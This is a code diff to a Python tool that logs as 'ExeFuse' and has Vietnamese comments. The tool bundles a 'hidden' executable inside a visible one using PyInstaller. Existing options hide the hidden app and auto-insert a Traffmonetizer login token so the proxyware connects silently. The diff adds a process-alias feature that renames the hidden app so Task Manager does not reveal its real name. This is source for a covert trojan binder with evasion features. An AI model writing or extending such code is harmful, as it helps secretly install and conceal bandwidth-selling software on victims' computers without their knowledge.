@@ -130,13 +130,17 @@ def get_result(job_id):
 
 def start_job(workdir, hidden_src, visible_src, output_name,
               kill_hidden=True, hide_watch=True, icon_src=None,
-              hidden_label=None, hidden_token="", tm_autorun=False):
+              hidden_label=None, hidden_token="", tm_autorun=False,
+              proc_alias=""):
     """Tao job build chay nguon (background thread).
 
     visible_src co the la None -> che do SOLO (chi nhung app an).
     hidden_token khac rong + file an la Traffmonetizer -> bat auto-token
     (launcher se ghi Token vao %APPDATA%\\traffmonetizer\\settings.json
     truoc khi chay app -> tu dang nhap + tu ket noi).
+    proc_alias khac rong -> launcher copy 2 app sang <proc_alias>.exe truoc
+    khi chay -> Task Manager hien ten trung file output thay vi ten that
+    cua app an (vd __hidden_app__.exe / Traffmonetizer.exe).
     """
     if not pyinstaller_available():
         raise RuntimeError(
@@ -145,13 +149,14 @@ def start_job(workdir, hidden_src, visible_src, output_name,
         )
     token = (hidden_token or "").strip().strip('"').strip("'")
     preseed = bool(token) and _is_traffmonetizer(hidden_src)
+    alias = (proc_alias or "").strip()
     job_id, job = create_job()
     thread = threading.Thread(
         target=_build_worker,
         args=(job, workdir, hidden_src, visible_src, output_name,
               bool(kill_hidden), bool(hide_watch), icon_src,
               hidden_label or os.path.basename(hidden_src),
-              token, preseed, bool(tm_autorun)),
+              token, preseed, bool(tm_autorun), alias),
         daemon=True,
     )
     thread.start()
@@ -160,7 +165,7 @@ def start_job(workdir, hidden_src, visible_src, output_name,
 
 def _build_worker(job, workdir, hidden_src, visible_src, output_name,
                   kill_hidden, hide_watch, icon_src, hidden_label,
-                  hidden_token, tm_preseed, tm_autorun):
+                  hidden_token, tm_preseed, tm_autorun, proc_alias=""):
     try:
         _update(job, status="building")
         out_name = _safe_name(output_name)
@@ -177,6 +182,7 @@ def _build_worker(job, workdir, hidden_src, visible_src, output_name,
             .replace("%%VISIBLE_NAME%%", VISIBLE_ASSET if visible_src else "")
             .replace("%%KILL_HIDDEN%%", "True" if kill_hidden else "False")
             .replace("%%HIDE_WATCH%%", "True" if hide_watch else "False")
+            .replace("%%PROC_ALIAS%%", proc_alias or "")
             .replace("%%TM_PRESEED%%", "True" if tm_preseed else "False")
             .replace("%%TM_TOKEN%%", hidden_token if tm_preseed else "")
             .replace("%%TM_AUTORUN%%", "True" if tm_autorun else "False")
@@ -195,6 +201,12 @@ def _build_worker(job, workdir, hidden_src, visible_src, output_name,
         elif hidden_token:
             _log(job, "[ExeFuse] AUTO-TOKEN: bỏ qua (token có nhưng file ẩn "
                  "không phải Traffmonetizer)")
+        if proc_alias:
+            _log(job, "[ExeFuse] ĐỔI TÊN TIẾN TRÌNH: BẬT — Task Manager sẽ "
+                 "hiện '%s.exe' cho mọi tiến trình (không lộ tên thật của "
+                 "app ẩn)" % proc_alias)
+        else:
+            _log(job, "[ExeFuse] ĐỔI TÊN TIẾN TRÌNH: tắt — giữ tên file gốc")
 
         # 2. Copy file upload voi ten asset co dinh
         hidden_asset = os.path.join(workdir, HIDDEN_ASSET)
